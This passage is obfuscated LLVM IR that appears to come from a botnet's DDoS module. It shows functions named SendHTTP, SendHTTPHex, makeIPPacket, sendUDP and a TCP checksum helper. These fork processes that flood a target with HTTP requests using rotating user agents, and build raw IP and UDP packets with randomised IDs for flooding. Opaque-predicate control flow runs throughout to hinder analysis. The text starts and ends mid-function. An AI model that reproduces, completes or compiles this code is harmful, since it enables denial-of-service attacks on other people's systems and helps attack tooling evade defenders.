  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #3
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #3
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = load i32, i32* @x.83
  %8 = load i32, i32* @y.84
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca [512 x i8], align 16
  %26 = alloca [1 x i8], align 1
  store i8* %0, i8** %15, align 8
  store i8* %1, i8** %16, align 8
  store i16 %2, i16* %17, align 2
  store i8* %3, i8** %18, align 8
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %27 = call i64 @time(i64* null) #3
  %28 = load i32, i32* %19, align 4
  %29 = sext i32 %28 to i64
  %30 = add nsw i64 %27, %29
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %22, align 4
  %32 = load i32, i32* @x.83
  %33 = load i32, i32* @y.84
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %99, %originalBBpart2
  %41 = load i32, i32* %22, align 4
  %42 = load i32, i32* %20, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %102

; <label>:44:                                     ; preds = %40
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %46 = load i8*, i8** %15, align 8
  %47 = load i8*, i8** %18, align 8
  %48 = load i8*, i8** %16, align 8
  %49 = call i32 @rand() #3
  %50 = srem i32 %49, 36
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.249, i32 0, i32 0), i8* %46, i8* %47, i8* %48, i8* %53) #3
  %55 = call i32 @fork() #3
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %98

; <label>:57:                                     ; preds = %44
  br label %58

; <label>:58:                                     ; preds = %96, %57
  %59 = load i32, i32* %23, align 4
  %60 = sext i32 %59 to i64
  %61 = call i64 @time(i64* null) #3
  %62 = icmp sgt i64 %60, %61
  br i1 %62, label %63, label %97

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.83
  %65 = load i32, i32* @y.84
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  %72 = load i8*, i8** %16, align 8
  %73 = load i16, i16* %17, align 2
  %74 = call i32 @socket_connect(i8* %72, i16 zeroext %73)
  store i32 %74, i32* %21, align 4
  %75 = load i32, i32* %21, align 4
  %76 = icmp ne i32 %75, 0
  %77 = load i32, i32* @x.83
  %78 = load i32, i32* @y.84
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %76, label %85, label %96

; <label>:85:                                     ; preds = %originalBBpart28
  %86 = load i32, i32* %21, align 4
  %87 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %88 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %89 = call i64 @strlen(i8* %88) #9
  %90 = call i64 @write(i32 %86, i8* %87, i64 %89)
  %91 = load i32, i32* %21, align 4
  %92 = getelementptr inbounds [1 x i8], [1 x i8]* %26, i32 0, i32 0
  %93 = call i64 @read(i32 %91, i8* %92, i64 1)
  %94 = load i32, i32* %21, align 4
  %95 = call i32 @close(i32 %94)
  br label %96

; <label>:96:                                     ; preds = %85, %originalBBpart28
  br label %58

; <label>:97:                                     ; preds = %58
  call void @exit(i32 0) #11
  unreachable

; <label>:98:                                     ; preds = %44
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* %22, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %22, align 4
  br label %40

; <label>:102:                                    ; preds = %40
  %103 = load i32, i32* @x.83
  %104 = load i32, i32* @y.84
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %102
  %111 = load i32, i32* @x.83
  %112 = load i32, i32* @y.84
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %119 = alloca i8*, align 8
  %120 = alloca i8*, align 8
  %121 = alloca i16, align 2
  %122 = alloca i8*, align 8
  %123 = alloca i32, align 4
  %124 = alloca i32, align 4
  %125 = alloca i32, align 4
  %126 = alloca i32, align 4
  %127 = alloca i32, align 4
  %128 = alloca i32, align 4
  %129 = alloca [512 x i8], align 16
  %130 = alloca [1 x i8], align 1
  store i8* %0, i8** %119, align 8
  store i8* %1, i8** %120, align 8
  store i16 %2, i16* %121, align 2
  store i8* %3, i8** %122, align 8
  store i32 %4, i32* %123, align 4
  store i32 %5, i32* %124, align 4
  %131 = call i64 @time(i64* null) #3
  %132 = load i32, i32* %123, align 4
  %133 = sext i32 %132 to i64
  %_ = sub i64 0, %131
  %gen = add i64 %_, %133
  %_1 = sub i64 0, %131
  %gen2 = add i64 %_1, %133
  %_3 = shl i64 %131, %133
  %_4 = sub i64 0, %131
  %gen5 = add i64 %_4, %133
  %134 = add nsw i64 %131, %133
  %135 = trunc i64 %134 to i32
  store i32 %135, i32* %127, align 4
  store i32 0, i32* %128, align 4
  store i32 0, i32* %126, align 4
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  %136 = load i8*, i8** %16, align 8
  %137 = load i16, i16* %17, align 2
  %138 = call i32 @socket_connect(i8* %136, i16 zeroext %137)
  store i32 %138, i32* %21, align 4
  %139 = load i32, i32* %21, align 4
  %140 = icmp ne i32 %139, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %102
  br label %originalBB10
}

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #3
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.250, i32 0, i32 0)) #3
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %134, %6
  %28 = load i32, i32* @x.85
  %29 = load i32, i32* @y.86
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %14, align 4
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %36, %37
  %39 = load i32, i32* @x.85
  %40 = load i32, i32* @y.86
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %137

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %49 = load i8*, i8** %7, align 8
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %51 = load i8*, i8** %8, align 8
  %52 = call i32 @rand() #3
  %53 = srem i32 %52, 36
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 (i8*, i8*, ...) @sprintf(i8* %48, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.249, i32 0, i32 0), i8* %49, i8* %50, i8* %51, i8* %56) #3
  %58 = call i32 @fork() #3
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %133

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* @x.85
  %62 = load i32, i32* @y.86
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* @x.85
  %70 = load i32, i32* @y.86
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %115, %originalBBpart24
  %78 = load i32, i32* %15, align 4
  %79 = sext i32 %78 to i64
  %80 = call i64 @time(i64* null) #3
  %81 = icmp sgt i64 %79, %80
  br i1 %81, label %82, label %116

; <label>:82:                                     ; preds = %77
  %83 = load i8*, i8** %8, align 8
  %84 = load i16, i16* %9, align 2
  %85 = call i32 @socket_connect(i8* %83, i16 zeroext %84)
  store i32 %85, i32* %13, align 4
  %86 = load i32, i32* %13, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %115

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* @x.85
  %90 = load i32, i32* @y.86
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i32, i32* %13, align 4
  %98 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %99 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %100 = call i64 @strlen(i8* %99) #9
  %101 = call i64 @write(i32 %97, i8* %98, i64 %100)
  %102 = load i32, i32* %13, align 4
  %103 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %104 = call i64 @read(i32 %102, i8* %103, i64 1)
  %105 = load i32, i32* %13, align 4
  %106 = call i32 @close(i32 %105)
  %107 = load i32, i32* @x.85
  %108 = load i32, i32* @y.86
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %115

; <label>:115:                                    ; preds = %originalBBpart28, %82
  br label %77

; <label>:116:                                    ; preds = %77
  %117 = load i32, i32* @x.85
  %118 = load i32, i32* @y.86
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %116
  call void @exit(i32 0) #11
  %125 = load i32, i32* @x.85
  %126 = load i32, i32* @y.86
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:133:                                    ; preds = %47
  br label %134

; <label>:134:                                    ; preds = %133
  %135 = load i32, i32* %14, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %14, align 4
  br label %27

; <label>:137:                                    ; preds = %originalBBpart2
  %138 = load i32, i32* @x.85
  %139 = load i32, i32* @y.86
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %137
  %146 = load i32, i32* @x.85
  %147 = load i32, i32* @y.86
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %154 = load i32, i32* %14, align 4
  %155 = load i32, i32* %12, align 4
  %156 = icmp slt i32 %154, %155
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %157 = load i32, i32* %13, align 4
  %158 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %159 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %160 = call i64 @strlen(i8* %159) #9
  %161 = call i64 @write(i32 %157, i8* %158, i64 %160)
  %162 = load i32, i32* %13, align 4
  %163 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %164 = call i64 @read(i32 %162, i8* %163, i64 1)
  %165 = load i32, i32* %13, align 4
  %166 = call i32 @close(i32 %165)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %116
  call void @exit(i32 0) #11
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %137
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %23

; <label>:6:                                      ; preds = %1
  %7 = load i32, i32* @x.89
  %8 = load i32, i32* @y.90
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  store i32 1, i32* %2, align 4
  %15 = load i32, i32* @x.89
  %16 = load i32, i32* @y.90
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %42

; <label>:23:                                     ; preds = %1
  %24 = load i32, i32* @x.89
  %25 = load i32, i32* @y.90
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* %3, align 4
  %33 = call i32 @close(i32 %32)
  store i32 0, i32* %2, align 4
  %34 = load i32, i32* @x.89
  %35 = load i32, i32* @y.90
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %originalBBpart2
  %43 = load i32, i32* %2, align 4
  ret i32 %43

originalBBalteredBB:                              ; preds = %originalBB, %6
  store i32 1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %44 = load i32, i32* %3, align 4
  %45 = call i32 @close(i32 %44)
  store i32 0, i32* %2, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %62

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* @x.91
  %43 = load i32, i32* @y.92
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* %10, align 4
  %51 = trunc i32 %50 to i16
  %52 = call zeroext i16 @htons(i16 zeroext %51) #10
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @x.91
  %55 = load i32, i32* @y.92
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %37
  %63 = load i32, i32* @x.91
  %64 = load i32, i32* @y.92
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %71 = load i8*, i8** %9, align 8
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %73 = call i32 @getHost(i8* %71, %struct.in_addr* %72)
  %74 = icmp ne i32 %73, 0
  %75 = load i32, i32* @x.91
  %76 = load i32, i32* @y.92
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %83, label %84

; <label>:83:                                     ; preds = %originalBBpart24
  br label %591

; <label>:84:                                     ; preds = %originalBBpart24
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %86 = getelementptr inbounds [8 x i8], [8 x i8]* %85, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %86, i8 0, i64 8, i32 4, i1 false)
  %87 = load i32, i32* %14, align 4
  store i32 %87, i32* %18, align 4
  %88 = load i32, i32* %12, align 4
  %89 = icmp eq i32 %88, 32
  br i1 %89, label %90, label %235

; <label>:90:                                     ; preds = %84
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #3
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %113, label %94

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @x.91
  %96 = load i32, i32* @y.92
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
